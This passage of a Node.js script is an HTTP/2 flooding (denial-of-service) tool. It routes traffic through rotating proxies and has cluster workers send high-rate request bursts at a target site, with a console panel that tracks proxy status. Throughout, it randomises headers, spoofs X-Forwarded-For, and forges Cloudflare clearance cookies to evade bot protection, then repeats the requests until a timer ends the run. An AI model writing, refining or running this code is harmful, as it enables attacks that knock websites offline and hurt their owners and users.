        if (code >= 500) return 'red';
        return 'white';
    }

    function displayProxyStatus() {
        console.clear();
        console.log(`========== PROXY STATUS & RESPONSE CODES ==========`.brightYellow);
        console.log(`Total Proxy: ${proxyStatus.size}`.brightCyan);
        const activeCount = Array.from(proxyStatus.values()).filter(d => d.status === 'aktif').length;
        const inactiveCount = Array.from(proxyStatus.values()).filter(d => d.status === 'mati').length;
        console.log(`Active: ${activeCount}`.brightGreen);
        console.log(`Inactive: ${inactiveCount}`.brightRed);
        console.log(`--------------------------------------------`.gray);
        
        let index = 1;
        const sortedEntries = Array.from(proxyStatus.entries())
            .sort((a, b) => {
                if (a[1].status === 'aktif' && b[1].status === 'mati') return -1;
                if (a[1].status === 'mati' && b[1].status === 'aktif') return 1;
                return b[1].requests - a[1].requests;
            });
        
        for (const [ip, data] of sortedEntries) {
            const statusIcon = data.status === 'aktif' ? '✅' : '❌';
            const statusText = data.status === 'aktif' ? 'Aktif' : 'Mati';
            
            let line = `${String(index).padStart(3)}. ${ip.padEnd(20)} ${statusText.padEnd(6)} ${statusIcon}`;
            
            if (data.status === 'aktif') {
                line += ` request = ${String(data.requests).padStart(6)}`;
                
                if (data.lastCode) {
                    const color = getStatusColor(data.lastCode);
                    const codeStr = String(data.lastCode);
                    const statusDesc = data.lastResponse;
                    if (color === 'green') {
                        line += `     ${codeStr.green}(${statusDesc.green})`;
                    } else if (color === 'yellow') {
                        line += `     ${codeStr.yellow}(${statusDesc.yellow})`;
                    } else {
                        line += `     ${codeStr.red}(${statusDesc.red})`;
                    }
                }
            }
            
            console.log(line);
            index++;
        }
        console.log(`--------------------------------------------`.gray);
        console.log(`Last Update: ${new Date().toLocaleTimeString()}`.brightGreen);
        console.log(`Proxy Rotation: Active`.brightMagenta);
    }

    setInterval(displayProxyStatus, 3000);

    cluster.on('message', (worker, message, handle) => {
        if (message && message.type === 'proxyStatus') {
            updateProxyStatus(message.proxy, message.active, message.code || null);
        }
    });

    // ========== AKHIR TAMBAHAN ==========

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}

    async HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = await net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const path = parsedTarget.path.replace(/%RAND%/, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
const Socker = new NetSocket();

headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers["origin"] = parsedTarget.host;
headers[":path"] = (parsedTarget.path || "/") + "?" + randstr(3) + "=" + generateRandomString(10, 15) + "&" + randstr(4) + "=" + randstrs(8);
headers[":scheme"] = "https";
headers["accept"] = accept;
headers["accept-encoding"] = encoding;
headers["accept-language"] = lang;
headers["cache-control"] = control;
headers["pragma"] = "no-cache";
headers["referer"] = Ref;
headers["sec-ch-ua"] = uaas;
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = platformx;
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = site1;
headers["sec-fetch-user"] = "?1";
headers["upgrade-insecure-requests"] = "1";
headers["user-agent"] = uap1;
headers["cookie"] = "__cf_bm=" + generateRandomString(32, 64) + "." + randstrs(6) + "." + randstrs(4) + ".0-" + randstrs(8) + "." + randstrs(6) + " " + randstr(4) + "=; cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=GA1.2." + randstrs(12) + "." + randstrs(8) + ";_gid=GA1.2." + randstrs(12) + "." + randstrs(8) + "; __cflb=" + randstrs(6) + "." + randstrs(16) + "." + randstrs(12) + ";" + randstr(4) + "=" + randstrs(8) + ";" + randstr(6) + "=" + generateRandomString(8,16) + ";";
headers["priority"] = "u=0, 1";
//headers["connection"] = "keep-alive";
headers["cdn-loop"] = "cloudflare";
headers["x-forwarded-proto"] = "https";
headers["X-Forwarded-For"] = spoofed;
headers["TE"] = "trailers";
headers["dnt"] = "1";
headers["x-content-type-options"] = "nosniff";
headers["x-requested-with"] = "XMLHttpRequest";

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffledObject = {};
    for (const key of keys) {
        shuffledObject[key] = obj[key];
    }
    return shuffledObject;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    // ===== TAMBAHAN: Kirim status awal ke master =====
    if (cluster.isWorker) {
        process.send({
            type: 'proxyStatus',
            proxy: proxyAddr,
            active: false,
            code: null
        });
    }
    // ===== AKHIR TAMBAHAN =====

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10,
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        // ===== TAMBAHAN: Kirim status koneksi =====
        if (error) {
            if (cluster.isWorker) {
                process.send({
                    type: 'proxyStatus',
                    proxy: proxyAddr,
                    active: false,
                    code: null
                });
            }
            return;
        }

        if (cluster.isWorker) {
            process.send({
                type: 'proxyStatus',
                proxy: proxyAddr,
                active: true,
                code: null
            });
        }
        // ===== AKHIR TAMBAHAN =====

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            rejectUnauthorized: false,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: connection,
            ecdhCurve: "X25519:prime256v1",
            ciphers: cipper,
            secureProtocol: "TLS_method",
            ALPNProtocols: ['h2'],
            session: crypto.randomBytes(16),
            timeout: 1000,
        };

        const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = await http2.connect(parsedTarget.href, {
            protocol: "https",
            settings: {
                headerTableSize: 8192,
                maxConcurrentStreams: 1000,
                initialWindowSize: 65535,
                maxHeaderListSize: 16384,
                maxFrameSize: 32768,
                enablePush: false,
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 8192,
            maxConcurrentStreams: 1000,
            initialWindowSize: 65535,
            maxHeaderListSize: 16384,
            maxFrameSize: 32768,
            enablePush: false,
        });

        let IntervalAttack;

        client.on("connect", async () => {
            IntervalAttack = setInterval(() => {
                const shuffledHeaders = shuffleObject({
                    ...headers,
                    ":method": "GET",
                    ":scheme": "https",
                    ":authority": parsedTarget.host,
                    ":path": (parsedTarget.path || "/") + "?" + randstr(5) + "=" + generateRandomString(15,25) + "&" + randstr(6) + "=" + randstrs(12),
                    "referer": Ref,
                    "accept-language": lang,
                    "cookie": "__cf_bm=" + generateRandomString(32, 64) + "." + randstrs(6) + "." + randstrs(4) + ".0-" + randstrs(8) + "." + randstrs(6) + " " + randstr(4) + "=; PHPSESSID=" + randstr(32) + "; cf-clearance=" + generateRandomString(32,64) + "; __cflb=" + randstrs(6) + "." + randstrs(16) + "." + randstrs(12) + ";" + randstr(4) + "=" + randstrs(8) + ";" + randstr(6) + "=" + generateRandomString(8,16) + "; _ga=GA1.2." + randstrs(12) + "." + randstrs(8) + ";_gid=GA1.2." + randstrs(12) + "." + randstrs(8) + ";" + randstr(5) + "=" + randstrs(10) + ";",
                    "x-forwarded-proto": "https",
                    "x-https": "on",
                    ...multi,
                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                    ...rateHeaders2[Math.floor(Math.random() * rateHeaders2.length)],
                    ...rateHeaders3[Math.floor(Math.random() * rateHeaders3.length)],
                    ...rateHeaders4[Math.floor(Math.random() * rateHeaders4.length)],
                    ...rateHeaders5[Math.floor(Math.random() * rateHeaders5.length)],
                    ...rateHeaders6[Math.floor(Math.random() * rateHeaders6.length)],
                    ...rateHeaders7[Math.floor(Math.random() * rateHeaders7.length)],
                    ...rateHeaders8[Math.floor(Math.random() * rateHeaders8.length)],
                    ...spoofHeaders[Math.floor(Math.random() * spoofHeaders.length)]                    
                });

                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(shuffledHeaders);
                    
                    // ===== TAMBAHAN: Kirim status code response =====
                    request.on('response', (response) => {
                        const statusCode = response[':status'] || response.statusCode || 200;
                        if (cluster.isWorker) {
                            process.send({
                                type: 'proxyStatus',
                                proxy: proxyAddr,
                                active: true,
                                code: statusCode
                            });
                        }
                        request.close();
                        request.destroy();
                    });
                    // ===== AKHIR TAMBAHAN =====

                    // ===== TAMBAHAN: Kirim status error request =====
                    request.on('error', () => {
                        if (cluster.isWorker) {
                            process.send({
                                type: 'proxyStatus',
                                proxy: proxyAddr,
                                active: false,
                                code: null
                            });
                        }
                        request.destroy();
                    });
                    // ===== AKHIR TAMBAHAN =====

                    request.end();
                }
            }, Math.floor(Math.random() * 1000) + 500);
        });

        client.on("close", () => {
            clearInterval(IntervalAttack);
            client.destroy();
            connection.destroy();

            // ===== TAMBAHAN: Kirim status close =====
            if (cluster.isWorker) {
                process.send({
                    type: 'proxyStatus',
                    proxy: proxyAddr,
                    active: false,
                    code: null
                });
            }
            // ===== AKHIR TAMBAHAN =====
        });

        // ===== TAMBAHAN: Handler error client =====
        client.on("error", () => {
            clearInterval(IntervalAttack);
            client.destroy();
            connection.destroy();

            if (cluster.isWorker) {
                process.send({
                    type: 'proxyStatus',
                    proxy: proxyAddr,
                    active: false,
                    code: null
                });
            }
        });
        // ===== AKHIR TAMBAHAN =====
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);